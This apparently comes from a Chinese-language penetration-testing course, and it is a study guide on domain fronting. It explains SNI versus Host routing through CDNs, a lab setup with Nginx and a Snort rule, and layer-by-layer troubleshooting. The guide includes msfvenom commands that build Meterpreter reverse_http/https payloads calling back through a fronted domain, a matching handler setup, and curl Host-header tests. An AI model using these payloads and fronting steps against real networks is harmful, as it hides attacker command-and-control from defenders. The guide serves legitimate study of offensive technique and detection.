# 域前置技术完整指南

> 对应参考资料：`10：绕过网络过滤器.html` 中的 Domain Fronting。  
> 学习定位：理解 SNI、Host、CDN 路由和出网过滤之间的关系。传统域前置在很多现实平台已被限制，学习重点是原理、实验复现、流量观察和排错判断。

## 这篇解决什么问题

当 payload 能执行但没有回连时，新手最容易直接换 payload。其实很多时候不是 payload 坏了，而是网络层拦了。

域前置尝试解决的问题是：

```text
目标网络允许访问高信誉 CDN/云服务域名
但不允许访问你的真实 C2 域名
```

域前置的思路是让外层观察者看到“看起来正常”的前置域名，而让 CDN 在 HTTP 层把请求路由到真实后端。

一句话：

```text
TLS 层给防火墙看一个前端域名，HTTP 层让 CDN 转到真实后端。
```

---

## 一、先理解网络设备能看到什么

### 1.1 不同层看到的信息不同

| 层级 | 典型字段 | 网络设备可能看到什么 |
|---|---|---|
| DNS | 查询域名 | `front.example.com` |
| TCP | 目标 IP/端口 | CDN 边缘节点 IP、443 |
| TLS | SNI、证书 | `front.example.com`、证书链 |
| HTTP | Host、URI、User-Agent | 如果 HTTPS 未解密，普通设备看不到 |
| 应用层 | C2 协议内容 | 需要代理解密或终端检测 |

域前置利用的就是：

```text
没有 HTTPS 解密时，很多设备主要基于 DNS/SNI/IP/证书做判断。
```

如果这些层看起来像允许访问的 CDN 域名，流量可能通过。

### 1.2 SNI 和 Host 的区别

| 字段 | 所在层 | 作用 |
|---|---|---|
| SNI | TLS Client Hello | 告诉服务器想访问哪个域名，用于选择证书 |
| Host Header | HTTP 请求头 | 告诉 Web/CDN 要访问哪个站点或后端 |

普通 HTTPS 请求中，它们通常一致：

```text
SNI: www.example.com
Host: www.example.com
```

传统域前置中，它们故意不一致：

```text
SNI: front.example.com
Host: real-backend.example-cdn.com
```

如果 CDN 接受这种不一致，它就可能根据 `Host` 把请求转到真实后端。

## 二、域前置基本流程

```text
客户端
  -> DNS 查询 front.example.com
  -> 得到 CDN 边缘节点 IP
  -> TLS 握手，SNI = front.example.com
  -> 建立 HTTPS 连接
  -> HTTP 请求，Host = real-backend.example-cdn.com
  -> CDN 根据 Host 转发到真实后端
  -> 后端响应通过 CDN 返回
```

观察者视角：

| 观察位置 | 看到的内容 |
|---|---|
| DNS 日志 | 查询前置域名 |
| 防火墙 | 连接 CDN IP:443 |
| TLS SNI | 前置域名 |
| 未解密 HTTPS | 看不到 Host 和 URI |
| CDN/后端日志 | 看到真实 Host 和请求 |

这就是为什么课程会把它放在网络过滤绕过中。

## 三、CDN 为什么可能支持这种行为

CDN 的基本职责：

```text
很多网站
  -> 共用 CDN 边缘节点
  -> CDN 根据 Host/路径/配置
  -> 转发到不同源站
```

传统场景下，同一个边缘节点可能托管大量域名：

```text
front.example.com  -> CDN IP
site-a.cdn.net     -> 同一个 CDN IP
site-b.cdn.net     -> 同一个 CDN IP
```

如果 CDN 只看 HTTP `Host` 来路由，而不强制 Host 与 SNI/租户一致，就可能形成域前置。

现代很多平台已经加强校验：

| 校验 | 影响 |
|---|---|
| SNI 必须和 Host 一致 | 传统域前置失败 |
| Host 必须绑定到同一租户 | 跨租户前置失败 |
| 证书必须匹配配置 | TLS 阶段失败或返回错误 |
| 禁止未授权 Host 回源 | CDN 返回 403/404/421 |

所以你要把“课程原理”和“当前平台是否支持”分开记录。

## 四、实验环境中的可控复现

因为现实 CDN 策略会变化，学习阶段建议先用实验环境理解原理。

### 4.1 实验拓扑

```text
Windows 客户端
  -> Ubuntu 模拟 CDN / DNS / Nginx / Snort
  -> Kali C2 或测试 Web 服务
```

目标：

```text
直接访问 bad.com 被过滤
访问 good.com 允许
但通过 Host 头让 good.com 的代理转到 bad.com
```

### 4.2 hosts 示例

```text
172.16.51.21 good.com
172.16.51.21 cdn123.offseccdn.com
192.168.119.120 bad.com
```

解释：

| 名称 | 角色 |
|---|---|
| `good.com` | 前置域名，过滤器允许 |
| `cdn123.offseccdn.com` | CDN 路由 Host |
| `bad.com` | 真实后端或 C2 |

### 4.3 Nginx 模拟 CDN

HTTP 版本：

```nginx
server {
    listen 80;
    server_name cdn123.offseccdn.com;

    location / {
        proxy_pass http://192.168.119.120;
        proxy_set_header Host $http_host;
    }
}
```

HTTPS 版本需要证书和 TLS 配置。学习阶段先跑通 HTTP，再加 HTTPS。

### 4.4 Snort/DNS 过滤示例

阻止 `bad.com` DNS 查询：

```text
drop udp any any -> any 53 (
    msg:"Block bad.com";
    content:"|03|bad|03|com";
    sid:2013482;
)
```

测试：

```bash
curl http://bad.com
curl -H "Host: cdn123.offseccdn.com" http://good.com
```

如果第二个请求返回后端内容，说明你理解了核心路由差异。

## 五、真实 CDN 配置思路

> 现实平台策略变化很快。下面是课程学习思路，不保证某个云厂商当前仍支持传统跨租户域前置。实际操作前阅读 [12-域前置现实限制说明.md](/blog/osep/10-网络过滤绕过/12-域前置现实限制说明/)。

### 5.1 你需要什么

```text
一个你控制的后端域名
一个 CDN/云分发配置
一个可访问的前置域名
一个能设置 Host Header 的客户端或 C2
```

### 5.2 CDN 端常见配置

| 配置项 | 说明 |
|---|---|
| CDN endpoint | CDN 分配的访问域名 |
| Origin hostname | 真实源站 |
| Custom domain | 绑定的自定义域名 |
| Caching behavior | C2 通信通常需要绕过缓存 |
| TLS certificate | 证书必须和访问域名/平台要求匹配 |
| Host header forwarding | 是否允许保留/改写 Host |

### 5.3 为什么要禁用缓存

C2 通信是动态交互，不是静态资源缓存。

如果 CDN 缓存响应，可能出现：

| 现象 | 原因 |
|---|---|
| 会话异常 | CDN 返回旧响应 |
| handler 收不到请求 | 请求被 CDN 缓存命中 |
| 响应错乱 | 多个客户端共享缓存结果 |

所以课程中通常强调：

```text
Bypass cache
Bypass query string caching
```

## 六、测试一个域前置配置

### 6.1 测 DNS

```powershell
Resolve-DnsName front.example.com
```

或：

```bash
dig front.example.com
```

看点：

| 看什么 | 说明 |
|---|---|
| 是否解析成功 | DNS 是否被拦 |
| CNAME 链 | 是否指向 CDN |
| IP | 是否为 CDN 边缘节点 |

### 6.2 测 TCP 连通性

```powershell
Test-NetConnection front.example.com -Port 443
```

如果 443 不通，不要继续调 Host。先查端口过滤、代理或网络路径。

### 6.3 测 TLS/SNI

```bash
openssl s_client -connect front.example.com:443 -servername front.example.com
```

看点：

| 项目 | 意义 |
|---|---|
| 握手是否成功 | TLS 是否可达 |
| 证书 CN/SAN | 是否匹配前置域名 |
| 是否被企业代理替换证书 | 可能存在 TLS inspection |

### 6.4 测 Host Header 路由

```bash
curl -k -H "Host: real-backend.example.com" https://front.example.com/
```

判断：

| 返回 | 可能含义 |
|---|---|
| 后端页面 | Host 路由可能成功 |
| 403/404 | Host 未绑定或平台拒绝 |
| 421 Misdirected Request | SNI/Host 不匹配被拒 |
| TLS 错误 | SNI/证书问题 |
| 后端无日志 | 没有真正回源 |

### 6.5 看后端日志

一定要看后端是否收到请求。只看客户端返回不够。

记录：

```text
请求时间
源 IP 是否来自 CDN
Host Header
URI
User-Agent
状态码
```

## 七、Meterpreter/C2 配置理解

### 7.1 参数之间的关系

| 参数 | 作用 |
|---|---|
| `LHOST` | payload 连接的前置域名或地址 |
| `LPORT` | 连接端口 |
| `HttpHostHeader` | HTTP Host 头，用于 CDN 路由 |
| `OverrideLHOST` | staged payload 第二阶段使用的地址 |
| `OverrideRequestHost` | 控制请求 Host 覆盖行为 |

核心思路：

```text
网络外层连接前置域名
HTTP Host 指向 CDN 后端/真实路由名
handler 也要理解这个 Host 和二阶段地址
```

### 7.2 生成 payload 示例

HTTP：

```bash
msfvenom -p windows/x64/meterpreter/reverse_http \
  LHOST=front.example.com \
  LPORT=80 \
  HttpHostHeader=real-backend.example.com \
  -f exe -o http-df.exe
```

HTTPS：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=front.example.com \
  LPORT=443 \
  HttpHostHeader=real-backend.example.com \
  -f exe -o https-df.exe
```

### 7.3 handler 示例

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST front.example.com
set LPORT 443
set OverrideLHOST front.example.com
set OverrideRequestHost true
set HttpHostHeader real-backend.example.com
run -j
```

### 7.4 Staged 与 stageless 的差异

| 类型 | 注意点 |
|---|---|
| Staged | 第一阶段和第二阶段都要能通过前置链路 |
| Stageless | 没有单独第二阶段，配置相对少 |

如果 staged 第一阶段连上但第二阶段失败，优先查 `OverrideLHOST`、`OverrideRequestHost` 和 Host Header。

## 八、流量分析要看什么

### 8.1 Wireshark 观察点

| 层 | 过滤/观察 |
|---|---|
| DNS | 查询是否为前置域名 |
| TCP | 目标是否为 CDN IP |
| TLS | Client Hello 中 SNI |
| HTTP | 如果是 HTTP 明文，看 Host |
| HTTPS | 未解密时看不到 Host |

### 8.2 成功时的特征

```text
DNS: front.example.com
TLS SNI: front.example.com
TCP: CDN IP:443
后端日志: Host = real-backend.example.com 的请求
```

### 8.3 失败时不要只看客户端

必须同时看：

```text
客户端错误
CDN 返回码
后端访问日志
handler 输出
抓包结果
```

这样才能判断是哪一层坏了。

## 九、现实限制与替代路线

### 9.1 现代限制

许多云厂商/CDN 已经限制传统域前置，常见原因：

| 限制 | 表现 |
|---|---|
| SNI/Host 必须一致 | 返回 421、403 或 TLS 失败 |
| 禁止跨租户 Host | CDN 不回源 |
| 只允许已绑定域名 | 返回默认错误页 |
| TLS inspection | 企业代理能看到 Host 或内容 |

详细排错见 [12-域前置现实限制说明.md](/blog/osep/10-网络过滤绕过/12-域前置现实限制说明/)。

### 9.2 替代路线

| 场景 | 替代思路 |
|---|---|
| 浏览器能出，payload 不出 | 代理感知通信 |
| 只允许 HTTP/HTTPS 且有代理 | 使用系统代理、合法证书、正常 User-Agent |
| 只允许 DNS | DNS 隧道 |
| TLS 被解密 | 降低异常特征，选择被允许业务路径 |
| CDN 前置失败 | 记录限制，切换其他出网通道 |

## 十、排错表

| 现象 | 优先判断 | 验证方法 | 下一步 |
|---|---|---|---|
| DNS 失败 | 前置域名被拦 | `Resolve-DnsName` | 换允许域名或查 DNS 过滤 |
| 443 不通 | 端口/IP 被拦 | `Test-NetConnection` | 查防火墙/代理 |
| TLS 握手失败 | SNI/证书/代理 | `openssl s_client` | 查证书和 TLS inspection |
| 返回 CDN 403/404 | Host 未绑定或租户限制 | `curl -H Host` | 查 CDN 配置 |
| 返回 421 | SNI/Host 不匹配 | 对比 SNI 和 Host | 平台可能禁止传统前置 |
| 后端无日志 | 没有回源 | 看源站日志 | 查 Host/路径/缓存 |
| handler 无会话 | C2 参数不一致 | 对齐 payload/handler | 查 LHOST/HttpHostHeader |
| 第一阶段成功第二阶段失败 | staged 配置问题 | handler 日志 | 查 Override 参数 |

## 十一、考试与复习重点

你不需要赌某个 CDN 还能不能传统域前置。你需要能解释：

```text
1. SNI 和 Host 的区别
2. 为什么 CDN 能按 Host 路由
3. 为什么未解密 HTTPS 下防火墙看不到 Host
4. 为什么现代 CDN 会限制 SNI/Host 不一致
5. 如何用 DNS/TCP/TLS/Host/后端日志逐层排错
6. 域前置失败后应该切到哪条出网路线
```

## 十二、练习任务

### 练习 1：画流程

画出：

```text
客户端 -> DNS -> CDN -> 后端
```

并标注 DNS、SNI、Host、证书分别在哪一层。

### 练习 2：HTTP 模拟 CDN

1. 用 Nginx 配一个反向代理。
2. 用 `curl -H "Host: ..."` 控制路由。
3. 在后端日志确认 Host 和来源。

### 练习 3：TLS 观察

1. 用 `openssl s_client` 指定 `-servername`。
2. 观察返回证书。
3. 记录 SNI 与证书匹配关系。

### 练习 4：排错记录

使用下面模板：

```text
前置域名：
真实后端：
DNS 是否成功：
TCP 443 是否通：
TLS SNI：
证书结果：
Host Header 测试：
CDN 返回码：
后端是否收到请求：
handler 是否收到连接：
最终判断：
```
